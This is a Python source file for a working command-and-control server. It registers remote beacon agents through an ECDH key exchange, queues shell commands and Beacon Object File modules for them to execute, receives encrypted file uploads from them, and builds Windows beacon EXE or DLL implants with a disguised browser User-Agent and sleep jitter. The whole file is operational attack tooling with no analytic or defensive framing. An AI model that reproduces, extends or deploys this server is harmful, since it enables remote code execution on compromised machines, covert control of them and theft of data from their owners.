#!/usr/bin/env python3
"""
C2 Server — structured tasking via the package layer.
/register, /getbof, /upload remain plain HTTP. /checkin speaks packages.
"""

import os, re, sys, json, uuid, threading, logging, struct, hashlib, argparse, shlex, subprocess
from datetime import datetime
from flask import Flask, request

from cryptography.hazmat.primitives.asymmetric.ec import (
    ECDH, generate_private_key, SECP256R1, EllipticCurvePublicKey
)
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat

from package import (
    PackageBuilder, PackageReader, parse_batch, build_batch,
    PKG_CMD_CHECKIN, PKG_CMD_TASK_OUTPUT, PKG_CMD_TASK_ERROR,
    PKG_CMD_TASK_COMPLETE, PKG_CMD_BOF_OUTPUT,
    PKG_CMD_EXIT, PKG_CMD_BOF_EXECUTE, PKG_CMD_EXEC_SHELL,
    PKG_CMD_TASK_BATCH, PKG_FLAG_ENCRYPTED, PKG_FLAG_BATCH,
    _decrypt_payload, _encrypt_payload, agent_id_hash
)

# Beacon generator (for BOF argument packing)
try:
    from beacon_generate import BeaconPack
except ImportError:
    sys.exit("FATAL  beacon_generate.py not found")

# ---------------------------------------------------------------------------
# CLI config
# ---------------------------------------------------------------------------
_arg_parser = argparse.ArgumentParser(prog="c2server", description="C2 Server")
_arg_parser.add_argument("--ip",     default="0.0.0.0",       metavar="ADDR",  help="bind address          (default: 0.0.0.0)")
_arg_parser.add_argument("--port",   default=8080, type=int,   metavar="PORT",  help="listen port           (default: 8080)")
_arg_parser.add_argument("--token",  default="",               metavar="TOKEN", help="registration auth token (default: none)")
_arg_parser.add_argument("--https",  action="store_true",                       help="enable HTTPS (requires --cert and --key)")
_arg_parser.add_argument("--cert",   default="",               metavar="FILE",  help="TLS certificate file")
_arg_parser.add_argument("--key",    default="",               metavar="FILE",  help="TLS key file")
SERVER_ARGS = _arg_parser.parse_args()

LISTEN_IP   = SERVER_ARGS.ip
LISTEN_PORT = SERVER_ARGS.port
AUTH_TOKEN  = SERVER_ARGS.token
USE_HTTPS   = SERVER_ARGS.https
SSL_CONTEXT = (SERVER_ARGS.cert, SERVER_ARGS.key) if (USE_HTTPS and SERVER_ARGS.cert and SERVER_ARGS.key) else None

# ---------------------------------------------------------------------------
# Flask setup
# ---------------------------------------------------------------------------
app = Flask(__name__)
logging.getLogger("werkzeug").setLevel(logging.ERROR)

agents        = {}
command_queue = {}     # aid -> list of task dicts
BOF_DIR       = "bofs"
UPLOAD_DIR    = "uploads"
STATE_FILE    = "agents.json"
AUTH_HEADER   = "X-C2-Token"

_print_lock     = threading.Lock()
_current_prompt = ""

# ---------------------------------------------------------------------------
# ECDH key exchange (same as before)
# ---------------------------------------------------------------------------
def ecdh_derive_session_key(our_priv, peer_pub_bytes: bytes) -> bytes:
    peer_pub = EllipticCurvePublicKey.from_encoded_point(SECP256R1(), peer_pub_bytes)
    shared   = our_priv.exchange(ECDH(), peer_pub)
    return hashlib.sha256(shared).digest()

# ---------------------------------------------------------------------------
# Terminal primitives (unchanged, except minor additions)
# ---------------------------------------------------------------------------
W  = 72
HR = "─" * W
HL = "━" * W

RESET  = "\033[0m"
BOLD   = "\033[1m"
DIM    = "\033[2m"
RED    = "\033[38;5;196m"
GREEN  = "\033[38;5;82m"
YELLOW = "\033[38;5;220m"
CYAN   = "\033[38;5;117m"
GREY   = "\033[38;5;244m"
WHITE  = "\033[38;5;255m"

def _no_color():
    return not sys.stdout.isatty() or os.environ.get("NO_COLOR")

def c(text, color):
    return text if _no_color() else f"{color}{text}{RESET}"

def ts():
    return datetime.now().strftime("%H:%M:%S")

_TAGS = {
    "ok"  : lambda: c("  OK  ", GREEN),
    "err" : lambda: c(" ERR  ", RED),
    "send": lambda: c(" SEND ", CYAN),
    "recv": lambda: c(" RECV ", CYAN),
    "up"  : lambda: c("  UP  ", YELLOW),
    "down": lambda: c(" DOWN ", YELLOW),
    "info": lambda: c(" INFO ", GREY),
    "warn": lambda: c(" WARN ", YELLOW),
    "build": lambda: c("BUILD ", CYAN),
}

def _reprint_prompt():
    if _current_prompt:
        sys.stdout.write(_current_prompt)
        sys.stdout.flush()

def log(msg, level="info"):
    tag = _TAGS.get(level, _TAGS["info"])()
    with _print_lock:
        print(f" {c(ts(), GREY)} {tag}  {msg}")

def async_log(msg, level="info"):
    tag = _TAGS.get(level, _TAGS["info"])()
    with _print_lock:
        sys.stdout.write("\r\033[2K")
        print(f" {c(ts(), GREY)} {tag}  {msg}")
        _reprint_prompt()

def async_output(lines):
    with _print_lock:
        sys.stdout.write("\r\033[2K")
        for line in lines:
            print(line)
        _reprint_prompt()

def header(title, sub=None):
    print(f"\n{c(HL, DIM)}")
    print(f"  {c(title, BOLD + WHITE)}")
    if sub:
        print(f"  {c(sub, GREY)}")
    print(c(HR, DIM))

def row(k, v, w=24):
    print(f"  {c(k.ljust(w), GREY)}{v}")

def _visible_len(s):
    return len(re.sub(r'\033\[[0-9;]*m', '', str(s)))

def _pad(s, width):
    s = str(s)
    return s + (" " * max(width - _visible_len(s), 0))

def table_header(*cols):
    widths, labels = zip(*cols)
    line = "  " + "".join(l.ljust(w) for l, w in zip(labels, widths))
    print(c(line, DIM))
    print(c("  " + HR, DIM))

def table_row(*cols):
    widths, values = zip(*cols)
    print("  " + "".join(_pad(v, w) for v, w in zip(values, widths)))

def section_end():
    print(c(HR, DIM) + "\n")

def fmt_bytes(n):
    for u in ("B", "KB", "MB", "GB"):
        if n < 1024:
            return f"{n:.1f} {u}"
        n /= 1024
    return f"{n:.1f} TB"

def fmt_age(dt):
    s = (datetime.now() - dt).total_seconds()
    if s < 60:   return f"{int(s)}s ago"
    if s < 3600: return f"{int(s/60)}m ago"
    return f"{int(s/3600)}h ago"

def agent_status(dt):
    s = (datetime.now() - dt).total_seconds()
    if s < 15:  return c("LIVE", GREEN)
    if s < 120: return c("IDLE", YELLOW)
    return c("DEAD", RED)

# ---------------------------------------------------------------------------
# New agent structure (with task tracking)
# ---------------------------------------------------------------------------
def new_agent(key: bytes) -> dict:
    return {
        "key":            key,
        "last_seen":      datetime.now(),
        "registered":     datetime.now(),
        "output_history": [],        # list of {task_id, timestamp, output}
        "last_output":    "",
        "command_count":  0,
        "bytes_sent":     0,
        "bytes_received": 0,
        "task_id_counter": 0,
        "pending_tasks":  [],        # list of task dicts
        "in_flight":      {},        # task_id -> task dict (for correlation)
    }

# ---------------------------------------------------------------------------
# Persistence (adapted)
# ---------------------------------------------------------------------------
def save_state():
    try:
        data = {}
        for aid, a in agents.items():
            data[aid] = {
                "key":            a["key"].hex(),
                "last_seen":      a["last_seen"].isoformat(),
                "registered":     a["registered"].isoformat(),
                "output_history": [
                    {
                        "task_id":   entry.get("task_id", 0),
                        "timestamp": entry["timestamp"].isoformat(),
                        "output":    entry["output"],
                    }
                    for entry in a["output_history"]
                ],
                "last_output":    a["last_output"],
                "command_count":  a["command_count"],
                "bytes_sent":     a["bytes_sent"],
                "bytes_received": a["bytes_received"],
                "task_id_counter": a["task_id_counter"],
                "pending_tasks":  a["pending_tasks"],   # already serialisable
                "in_flight":      a["in_flight"],       # task_id -> task dict
            }
        with open(STATE_FILE, "w") as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        async_log(f"State save failed: {e}", "err")

def load_state():
    if not os.path.exists(STATE_FILE):
        return
    try:
        with open(STATE_FILE, "r") as f:
            data = json.load(f)
        for aid, state in data.items():
            try:
                agents[aid] = {
                    "key":            bytes.fromhex(state["key"]),
                    "last_seen":      datetime.fromisoformat(state["last_seen"]),
                    "registered":     datetime.fromisoformat(state["registered"]),
                    "output_history": [
                        {
                            "task_id":   entry.get("task_id", 0),
                            "timestamp": datetime.fromisoformat(entry["timestamp"]),
                            "output":    entry["output"],
                        }
                        for entry in state.get("output_history", [])
                    ],
                    "last_output":    state.get("last_output", ""),
                    "command_count":  state.get("command_count", 0),
                    "bytes_sent":     state.get("bytes_sent", 0),
                    "bytes_received": state.get("bytes_received", 0),
                    "task_id_counter": state.get("task_id_counter", 0),
                    "pending_tasks":  state.get("pending_tasks", []),
                    "in_flight":      state.get("in_flight", {}),
                }
                command_queue[aid] = []
            except Exception as e:
                async_log(f"Failed to restore agent {aid[:8]}: {e}", "warn")
        if agents:
            async_log(f"Restored {len(agents)} agent(s) from {STATE_FILE}", "ok")
    except Exception as e:
        async_log(f"Failed to load state: {e}", "err")

# ---------------------------------------------------------------------------
# Registration (unchanged)
# ---------------------------------------------------------------------------
@app.route("/register", methods=["POST"])
def route_register():
    beacon_pub_bytes = request.data

    if AUTH_TOKEN:
        token = request.headers.get(AUTH_HEADER, "")
        if token != AUTH_TOKEN:
            async_log(f"Bad /register auth from {request.remote_addr}", "warn")
            return b"forbidden", 403

    if len(beacon_pub_bytes) != 65 or beacon_pub_bytes[0] != 0x04:
        async_log("Bad /register — expected 65-byte X9.62 pubkey", "err")
        return b"bad request", 400

    try:
        server_priv      = generate_private_key(SECP256R1())
        server_pub_bytes = server_priv.public_key().public_bytes(
            Encoding.X962, PublicFormat.UncompressedPoint
        )
        session_key = ecdh_derive_session_key(server_priv, beacon_pub_bytes)
    except Exception as e:
        async_log(f"ECDH failed: {e}", "err")
        return b"error", 500

    aid                = str(uuid.uuid4())
    agents[aid]        = new_agent(session_key)
    command_queue[aid] = []

    async_log(
        f"Agent registered  id={c(aid[:8], CYAN)}  "
        f"key={c(session_key.hex(), DIM)}",
        "ok"
    )
    save_state()
    return server_pub_bytes + aid.encode(), 200, {"Content-Type": "application/octet-stream"}

# ---------------------------------------------------------------------------
# BOF download (unchanged)
# ---------------------------------------------------------------------------
@app.route("/getbof/<aid>/<name>", methods=["POST"])
def route_getbof(aid, name):
    if aid not in agents:
        return b"unknown", 404

    key  = agents[aid]["key"]
    base = os.path.basename(name)
    for suffix in (".obj", ".o"):
        if base.endswith(suffix):
            base = base[:-len(suffix)]
            break
    path = os.path.join(BOF_DIR, base + ".obj")

    if not os.path.exists(path):
        async_log(f"BOF not found: {base}", "err")
        return _encrypt_payload(key, b"not found"), 404

    with open(path, "rb") as f:
        bof_data = f.read()

    agents[aid]["bytes_sent"] += len(bof_data)
    async_log(f"BOF served  {c(base, CYAN)}  {fmt_bytes(len(bof_data))}  to {c(aid[:8], CYAN)}", "down")
    return _encrypt_payload(key, bof_data), 200, {"Content-Type": "application/octet-stream"}

# ---------------------------------------------------------------------------
# File upload (unchanged)
# ---------------------------------------------------------------------------
@app.route("/upload/<aid>/<filename>", methods=["POST"])
def route_upload(aid, filename):
    if aid not in agents:
        return b"unknown", 404

    key   = agents[aid]["key"]
    plain = _decrypt_payload(key, request.data)
    dest  = os.path.join(UPLOAD_DIR, aid[:8])
    os.makedirs(dest, exist_ok=True)
    with open(os.path.join(dest, filename), "wb") as f:
        f.write(plain)

    agents[aid]["bytes_received"] += len(request.data)
    async_log(f"Upload  {c(filename, CYAN)}  {fmt_bytes(len(plain))}  from {c(aid[:8], CYAN)}", "up")
    return _encrypt_payload(key, b"OK"), 200

# ---------------------------------------------------------------------------
# /checkin – package‑aware
# ---------------------------------------------------------------------------
@app.route("/checkin/<aid>", methods=["POST"])
def route_checkin(aid):
    if aid not in agents:
        return b"unknown", 404

    a   = agents[aid]
    key = a["key"]
    a["last_seen"] = datetime.now()

    # Decrypt and parse the top‑level package
    try:
        top = PackageReader(request.data, key)
    except Exception as e:
        async_log(f"Bad package from {aid[:8]}: {e}", "err")
        return b"bad request", 400

    # Process sub‑packages (batch or single)
    if top.flags & PKG_FLAG_BATCH:
        readers = parse_batch(top.payload, key)
    else:
        readers = [top]

    for reader in readers:
        _process_incoming_package(aid, a, reader)

    # Build response: batch of pending tasks
    pending = a["pending_tasks"]
    sub_packages = []

    for task in list(pending):    # copy because we'll clear
        task_id = task["task_id"]
        pkg = None
        if task["type"] == "shell":
            pkg = PackageBuilder(PKG_CMD_EXEC_SHELL, request_id=task_id,
                                 encrypt=True, agent_id=aid)
            pkg.add_string(task["cmd"])
        elif task["type"] == "bof":
            pkg = PackageBuilder(PKG_CMD_BOF_EXECUTE, request_id=task_id,
                                 encrypt=True, agent_id=aid)
            pkg.add_string(task["name"])
            pkg.add_bytes(bytes.fromhex(task["bof_data"]))
            pkg.add_string(task["args_hex"])
        elif task["type"] == "kill":
            pkg = PackageBuilder(PKG_CMD_EXIT, request_id=task_id,
                                 encrypt=True, agent_id=aid)
            # no payload

        if pkg:
            sub_packages.append(pkg)
            a["in_flight"][str(task_id)] = task
            a["command_count"] += 1

    # Clear pending
    a["pending_tasks"] = []

    # Build batch package (or empty checkin if nothing to send)
    if sub_packages:
        wire = build_batch(PKG_CMD_TASK_BATCH, sub_packages, key, agent_id=aid)
        a["bytes_sent"] += len(wire)
        save_state()
        return wire, 200, {"Content-Type": "application/octet-stream"}
    else:
        # Send empty encrypted payload (the agent will decrypt to nothing)
        empty_pkg = PackageBuilder(PKG_CMD_CHECKIN, encrypt=True, agent_id=aid)
        wire = empty_pkg.finalize(key)
        a["bytes_sent"] += len(wire)
        save_state()
        return wire, 200, {"Content-Type": "application/octet-stream"}


def _process_incoming_package(aid, agent, reader: PackageReader):
    """Handle one incoming sub‑package."""
    # Accumulate raw bytes for stats
    agent["bytes_received"] += len(reader._raw_payload)  # approximate

    cmd = reader.command
    tid = reader.request_id

    if cmd == PKG_CMD_TASK_OUTPUT:
        output = reader.read_string()
        _record_output(agent, tid, output)
        _mark_task_complete(agent, tid)
        # Display
        lines = [
            f"\n{c(HL, DIM)}",
            f"  {c('OUTPUT', BOLD + WHITE)}  {c(aid[:8], CYAN)}  {c(ts(), GREY)}  task={tid}",
            c(HR, DIM),
        ]
        for line in output.splitlines():
            lines.append(f"  {line}")
        lines.append(c(HR, DIM))
        async_output(lines)

    elif cmd == PKG_CMD_TASK_ERROR:
        error_code = reader.read_int32()
        async_log(f"Agent {aid[:8]} task {tid} error {error_code}", "err")
        _mark_task_complete(agent, tid)

    elif cmd == PKG_CMD_TASK_COMPLETE:
        _mark_task_complete(agent, tid)

    elif cmd == PKG_CMD_BOF_OUTPUT:
        output = reader.read_string()
        _record_output(agent, tid, "[BOF] " + output)
        _mark_task_complete(agent, tid)
        lines = [
            f"\n{c(HL, DIM)}",
            f"  {c('BOF OUT', BOLD + WHITE)}  {c(aid[:8], CYAN)}  task={tid}",
            c(HR, DIM),
        ]
        for line in output.splitlines():
            lines.append(f"  {line}")
        lines.append(c(HR, DIM))
        async_output(lines)

    elif cmd == PKG_CMD_CHECKIN:
        # Empty checkin, nothing to do
        pass

    # Add other commands if needed


def _record_output(agent, task_id, output):
    agent["output_history"].append({
        "task_id": task_id,
        "timestamp": datetime.now(),
        "output": output,
    })
    agent["last_output"] = output
    # Keep only last 200 entries
    if len(agent["output_history"]) > 200:
        agent["output_history"] = agent["output_history"][-200:]

def _mark_task_complete(agent, task_id):
    agent["in_flight"].pop(str(task_id), None)

# ---------------------------------------------------------------------------
# CLI commands (adapted for new task model)
# ---------------------------------------------------------------------------
def cmd_list():
    header("AGENTS")
    if not agents:
        print(f"  {c('no agents registered', GREY)}\n")
        return
    table_header(
        (10, "ID"),
        (8,  "STATUS"),
        (14, "LAST SEEN"),
        (8,  "CMDS"),
        (8,  "PEND"),
        (8,  "FLY"),
        (12, "SENT"),
        (12, "RECV"),
    )
    for aid, a in agents.items():
        table_row(
            (10, c(aid[:8], CYAN)),
            (8,  agent_status(a["last_seen"])),
            (14, fmt_age(a["last_seen"])),
            (8,  str(a["command_count"])),
            (8,  str(len(a["pending_tasks"]))),
            (8,  str(len(a["in_flight"]))),
            (12, fmt_bytes(a["bytes_sent"])),
            (12, fmt_bytes(a["bytes_received"])),
        )
    section_end()

def cmd_bofs():
    header("BOF MODULES", sub=os.path.abspath(BOF_DIR))
    if not os.path.isdir(BOF_DIR):
        os.makedirs(BOF_DIR, exist_ok=True)
        print(f"  {c('directory created — drop .obj files here', GREY)}\n")
        return
    files = [f for f in os.listdir(BOF_DIR) if f.endswith((".obj", ".o"))]
    if not files:
        print(f"  {c('no modules found', GREY)}\n")
        return
    table_header((32, "NAME"), (12, "SIZE"), (10, "FORMAT"))
    for f in sorted(files):
        ext  = ".obj" if f.endswith(".obj") else ".o"
        base = f[:-len(ext)]
        size = os.path.getsize(os.path.join(BOF_DIR, f))
        table_row((32, c(base, WHITE)), (12, fmt_bytes(size)), (10, c(ext, GREY)))
    print(f"\n  {c(str(len(files)) + ' module(s)', GREY)}")
    section_end()

def cmd_info(aid):
    a = agents[aid]
    header("AGENT INFO", sub=aid)
    row("ID",             c(aid, CYAN))
    row("Short ID",       c(aid[:8], CYAN))
    row("Status",         agent_status(a["last_seen"]))
    row("Session key",    c(a["key"].hex(), DIM))
    row("Registered",     a["registered"].strftime("%Y-%m-%d %H:%M:%S"))
    row("Last seen",      a["last_seen"].strftime("%H:%M:%S") + f"  ({fmt_age(a['last_seen'])})")
    print()
    row("Commands",       str(a["command_count"]))
    row("Pending tasks",  str(len(a["pending_tasks"])))
    row("In‑flight tasks", str(len(a["in_flight"])))
    row("Output entries", str(len(a["output_history"])))
    row("Bytes sent",     fmt_bytes(a["bytes_sent"]))
    row("Bytes received", fmt_bytes(a["bytes_received"]))
    if a["last_output"]:
        print(f"\n  {c('last output preview', GREY)}")
        print(c("  " + HR, DIM))
        for line in a["last_output"][:400].splitlines():
            print(f"  {line}")
    section_end()

def cmd_stats(aid):
    a      = agents[aid]
    uptime = (datetime.now() - a["registered"]).total_seconds()
    header("STATISTICS", sub=aid[:8])
    row("Uptime",    f"{int(uptime)}s  ({int(uptime/60)}m)")
    row("Commands",  str(a["command_count"]))
    row("Outputs",   str(len(a["output_history"])))
    row("Sent",      fmt_bytes(a["bytes_sent"]))
    row("Received",  fmt_bytes(a["bytes_received"]))
    if a["command_count"]:
        row("Avg / cmd", fmt_bytes(a["bytes_sent"] / a["command_count"]))
    section_end()

def cmd_output(aid, n=10):
    hist = agents[aid]["output_history"]
    if not hist:
        print(f"  {c('no output recorded', GREY)}\n")
        return
    entries = hist[-n:]
    header("OUTPUT HISTORY", sub=f"showing {len(entries)} of {len(hist)}")
    for entry in entries:
        tid = entry.get("task_id", "?")
        print(f"  {c(entry['timestamp'].strftime('%H:%M:%S'), GREY)}  task={tid}")
        print(c("  " + HR, DIM))
        for line in entry["output"].splitlines():
            print(f"  {line}")
        print()
    section_end()

def cmd_generate(args_str):
    gen = argparse.ArgumentParser(prog="generate", add_help=False, exit_on_error=False)
    gen.add_argument("--ip",     default=LISTEN_IP  if LISTEN_IP != "0.0.0.0" else "127.0.0.1")
    gen.add_argument("--port",   default=str(LISTEN_PORT))
    gen.add_argument("--ua",     default="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
    gen.add_argument("--token",  default=AUTH_TOKEN)
    gen.add_argument("--sleep",  default="5000")
    gen.add_argument("--jitter", default="3000")
    gen.add_argument("--https",  action="store_true")
    gen.add_argument("--dll",    action="store_true",
                                 help="build as DLL instead of EXE")
    gen.add_argument("--out",    default=None)
    try:
        gargs = gen.parse_args(shlex.split(args_str) if args_str else [])
    except (argparse.ArgumentError, SystemExit):
        log("usage: generate [--ip X] [--port X] [--dll] [--out X] ...", "err")
        return

    # Resolve output filename + mode
    mode = "dll" if gargs.dll else "exe"
    if gargs.out is None:
        gargs.out = "beacon.dll" if gargs.dll else "beacon.exe"
    elif gargs.dll and gargs.out.endswith(".exe"):
        gargs.out = gargs.out[:-4] + ".dll"

    script_dir = os.path.dirname(os.path.abspath(__file__))
    bat        = os.path.join(script_dir, "..", "agent", "build.bat")
    bat        = os.path.normpath(bat)
    if not os.path.exists(bat):
        log(f"build.bat not found at {bat}", "err")
        return
    https_flag = "1" if gargs.https else "0"
    log(
        f"Building  {c(gargs.out, CYAN)}  "
        f"ip={c(gargs.ip, WHITE)}  port={c(gargs.port, WHITE)}  "
        f"https={c(str(gargs.https), WHITE)}  mode={c(mode, WHITE)}",
        "build"
    )
    agent_dir  = os.path.normpath(os.path.join(script_dir, "..", "agent"))
    build_dir  = os.path.join(agent_dir, "build")
    tmp_out    = "_tmp_" + gargs.out
    if os.name == "nt":
        invoke = ["cmd", "/c", bat, gargs.ip, gargs.port, gargs.ua,
                  gargs.token, gargs.sleep, gargs.jitter, https_flag,
                  tmp_out, mode]
    else:
        invoke = [bat, gargs.ip, gargs.port, gargs.ua,
                  gargs.token, gargs.sleep, gargs.jitter, https_flag,
                  tmp_out, mode]
    try:
        result = subprocess.run(invoke, capture_output=True, text=True, cwd=agent_dir)
    except Exception as e:
        log(f"Failed to invoke build.bat: {e}", "err")
        return
    if result.returncode == 0:
        tmp_path   = os.path.join(build_dir, tmp_out)
        final_path = os.path.join(build_dir, gargs.out)
        try:
            os.replace(tmp_path, final_path)
            log(f"Built  {c(final_path, CYAN)}", "ok")
        except OSError as e:
            log(f"Build succeeded but rename failed: {e}", "err")
            log(f"Binary is at {c(tmp_path, CYAN)}", "info")
    else:
        log("Build failed", "err")
        output = (result.stdout + result.stderr).strip()
        if output:
            print(c("  " + HR, DIM))
            for line in output[-800:].splitlines():
                print(f"  {c(line, GREY)}")
            print(c("  " + HR, DIM))

def cmd_help():
    header("COMMAND REFERENCE")
    sections = [
        ("GLOBAL", [
            ("list",                      "list all agents (shows PEND/FLY counts)"),
            ("bofs",                      "list available BOF modules"),
            ("generate [flags]",          "build a beacon binary"),
            ("use <id>",                  "select agent by full or partial ID"),
            ("clear",                     "clear the terminal"),
            ("help",                      "show this reference"),
            ("exit",                      "shutdown server"),
        ]),
        ("AGENT  (requires: use <id>)", [
            ("shell <cmd>",               "execute shell command (queued)"),
            ("bof <name> [args]",         "execute BOF module (queued)"),
            ("output [n]",                "show last N outputs (with task IDs)"),
            ("info",                      "agent details + queue status"),
            ("stats",                     "session statistics"),
            ("kill",                      "terminate the agent process"),
            ("back",                      "deselect agent"),
        ]),
        ("GENERATE FLAGS", [
            ("--ip ADDR",                 f"C2 server IP   (default: {LISTEN_IP})"),
            ("--port PORT",               f"C2 server port (default: {LISTEN_PORT})"),
            ("--ua STRING",               "HTTP User-Agent string"),
            ("--token STRING",            "registration auth token"),
            ("--sleep MS",                "beacon interval in ms"),
            ("--jitter MS",               "sleep jitter in ms"),
            ("--https",                   "enable HTTPS in beacon"),
            ("--out NAME",                "output filename"),
        ]),
        ("BOF ARGUMENT TYPES", [
            ("s:<value>",                 "UTF-8 string"),
            ("w:<value>",                 "UTF-16LE wide string"),
            ("i:<value>",                 "32-bit integer"),
            ("h:<value>",                 "16-bit short"),
            ("<value>",                   "no prefix defaults to string"),
        ]),
    ]
    for title, entries in sections:
        print(f"  {c(title, BOLD + WHITE)}")
        for cmd_str, desc in entries:
            print(f"  {c(cmd_str.ljust(32), CYAN)}{c(desc, GREY)}")
        print()
    section_end()


def send_cmd(aid, cmd):
    """Queue a shell command with a new task ID."""
    if aid not in agents:
        log("agent not found", "err")
        return
    a = agents[aid]
    task_id = a["task_id_counter"] = a["task_id_counter"] + 1
    task = {"type": "shell", "cmd": cmd, "task_id": task_id}
    a["pending_tasks"].append(task)
    log(f"Queued shell  agent={c(aid[:8], CYAN)}  task={task_id}  cmd={c(cmd, DIM)}", "info")

def send_bof(aid, name, args_str=""):
    """Queue a BOF task (embeds the .obj file directly)."""
    if aid not in agents:
        log("agent not found", "err")
        return

    a = agents[aid]

    # Locate the BOF file
    base = os.path.basename(name)
    for suffix in (".obj", ".o"):
        if base.endswith(suffix):
            base = base[:-len(suffix)]
            break
    path = os.path.join(BOF_DIR, base + ".obj")
    if not os.path.exists(path):
        log(f"BOF not found: {base}", "err")
        return

    try:
        with open(path, "rb") as f:
            bof_data = f.read()
    except Exception as e:
        log(f"Failed to read BOF: {e}", "err")
        return

    # Build arg hex
    bp = BeaconPack()
    for token in (args_str or "").split():
        if ":" in token:
            t, v = token.split(":", 1)
            if   t == "s": bp.addstr(v)
            elif t == "w": bp.addWstr(v)
            elif t == "i": bp.addint(int(v))
            elif t == "h": bp.addshort(int(v))
            else:
                log(f"Unknown arg type '{t}'", "err")
                return
        else:
            bp.addstr(token)
    args_hex = bp.getbuffer().hex()

    # Create task
    task_id = a["task_id_counter"] = a["task_id_counter"] + 1
    task = {
        "type": "bof",
        "name": base,               # human‑readable name
        "bof_data": bof_data.hex(), # hex for JSON serialisation, will be converted back
        "args_hex": args_hex,
        "task_id": task_id,
    }
    a["pending_tasks"].append(task)
    log(f"Queued BOF  agent={c(aid[:8], CYAN)}  task={task_id}  name={c(base, CYAN)}", "info")

def resolve_agent(partial):
    matches = [a for a in agents if a.startswith(partial)]
    if not matches:
        return None, f"no agent matched: {partial}"
    if len(matches) > 1:
        return None, f"ambiguous ID  matches={[m[:8] for m in matches]}"
    return matches[0], None


def interactive_shell():
    global _current_prompt
    current = None

    while True:
        try:
            prompt = (
                f" {c(current[:8], CYAN)} {c('>', GREY)} "
                if current else f" {c('>', GREY)} "
            )
            with _print_lock:
                _current_prompt = prompt
                sys.stdout.write(prompt)
                sys.stdout.flush()

            line = sys.stdin.readline()
            if not line:
                break
            line = line.strip()
            if not line:
                continue

            parts = line.split(maxsplit=1)
            cmd   = parts[0].lower()
            args  = parts[1] if len(parts) > 1 else ""

            if cmd == "exit":
                print(f"\n  {c('shutting down', GREY)}\n")
                save_state()
                break
            elif cmd == "clear":
                os.system("cls" if os.name == "nt" else "clear")
            elif cmd == "list":
                cmd_list()
            elif cmd == "bofs":
                cmd_bofs()
            elif cmd == "generate":
                cmd_generate(args)
            elif cmd == "help":
                cmd_help()
            elif cmd == "use":
                if not args:
                    log("usage: use <agent_id>", "err")
                    continue
                aid, err = resolve_agent(args)
                if err:
                    log(err, "err")
                else:
                    current = aid
                    log(f"selected {c(aid[:8], CYAN)}", "ok")
            elif cmd == "back":
                if current:
                    log(f"deselected {c(current[:8], CYAN)}", "ok")
                    current = None
                else:
                    log("no agent selected", "warn")
            elif cmd in ("shell", "bof", "output", "info", "stats", "kill"):
                if not current:
                    log("no agent selected  (use: use <id>)", "err")
                    continue
                if cmd == "shell":
                    if not args:
                        log("usage: shell <command>", "err")
                    else:
                        send_cmd(current, args)
                elif cmd == "bof":
                    if not args:
                        log("usage: bof <name> [type:arg ...]", "err")
                    else:
                        bof_parts = args.split(maxsplit=1)
                        send_bof(current, bof_parts[0],
                                 bof_parts[1] if len(bof_parts) > 1 else "")
                elif cmd == "output":
                    n = int(args) if args.isdigit() else 10
                    cmd_output(current, n)
                elif cmd == "info":
                    cmd_info(current)
                elif cmd == "stats":
                    cmd_stats(current)
                elif cmd == "kill":
                    # Queue a kill task
                    a = agents[current]
                    task_id = a["task_id_counter"] = a["task_id_counter"] + 1
                    task = {"type": "kill", "task_id": task_id}
                    a["pending_tasks"].append(task)
                    log(f"Kill queued for {c(current[:8], CYAN)}  task={task_id}", "warn")
                    current = None
            else:
                log(f"unknown command: {cmd}  (type help)", "err")

        except KeyboardInterrupt:
            print()
            log("interrupted  (exit to quit, back to deselect)", "warn")
            current = None
        except Exception as e:
            log(str(e), "err")
            import traceback; traceback.print_exc()


def banner():
    proto = "https" if USE_HTTPS else "http"
    print(f"\n{c(HL, DIM)}")
    print(f"  {c('C2 SERVER', BOLD + WHITE)}")
    print(f"  {c(f'{proto}://{LISTEN_IP}:{LISTEN_PORT}', GREY)}")
    print(f"{c(HL, DIM)}\n")


if __name__ == "__main__":
    os.makedirs(BOF_DIR,    exist_ok=True)
    os.makedirs(UPLOAD_DIR, exist_ok=True)

    load_state()
    banner()

    if AUTH_TOKEN:
        log(f"register auth enabled  header={AUTH_HEADER}", "warn")
    if USE_HTTPS:
        if SSL_CONTEXT:
            log(f"HTTPS enabled  cert={SERVER_ARGS.cert}", "warn")
        else:
            log("--https requires --cert and --key", "err")
            sys.exit(1)

    def _flask():
        app.run(
            host=LISTEN_IP, port=LISTEN_PORT,
            debug=False, use_reloader=False, threaded=True,
            ssl_context=SSL_CONTEXT if USE_HTTPS else None,
        )

    threading.Thread(target=_flask, daemon=True).start()

    log(f"listening    {LISTEN_IP}:{LISTEN_PORT}", "ok")
    log(f"bof dir      {os.path.abspath(BOF_DIR)}", "ok")
    log(f"upload dir   {os.path.abspath(UPLOAD_DIR)}", "ok")
    print()

    try:
        interactive_shell()
    except KeyboardInterrupt:
        print()
    finally:
        save_state()
        log("stopped", "ok")
        print()